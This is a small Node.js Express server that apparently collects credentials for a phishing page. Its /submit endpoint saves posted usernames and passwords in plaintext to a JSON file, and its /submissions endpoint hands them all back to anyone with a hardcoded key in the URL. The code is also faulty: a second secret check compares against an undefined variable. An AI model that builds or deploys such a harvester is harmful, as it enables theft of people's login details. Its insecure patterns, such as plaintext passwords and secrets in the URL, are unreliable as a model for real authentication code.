const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.static(__dirname));
app.use(express.json());

const dataFile = path.join(__dirname, 'submissions.json');

app.post('/submit', (req, res) => {
  const { username, password } = req.body;

  const entry = {
    username,
    password,
    timestamp: new Date().toISOString()
  };

  let existing = [];
  if (fs.existsSync(dataFile)) {
    existing = JSON.parse(fs.readFileSync(dataFile, 'utf8') || '[]');
  }

  existing.push(entry);
  fs.writeFileSync(dataFile, JSON.stringify(existing, null, 2));

  res.status(200).json({ message: 'Saved' });
});

app.get('/submissions', (req, res) => {
  const urlKey = req.query.key;

  if (urlKey !== "BellaAndHebe") {
    return res.status(403).json({ error: "Unauthorised" });
  }

  const SECRET = "SaraiJasuM";
  if (key !== SECRET) {
    return res.status(403).json({ error: "Unauthorized" });
  }

  if (fs.existsSync(dataFile)) {
    const data = JSON.parse(fs.readFileSync(dataFile, 'utf8') || '[]');
    res.json(data);
  } else {
    res.json([]);
  }
});


app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);

});



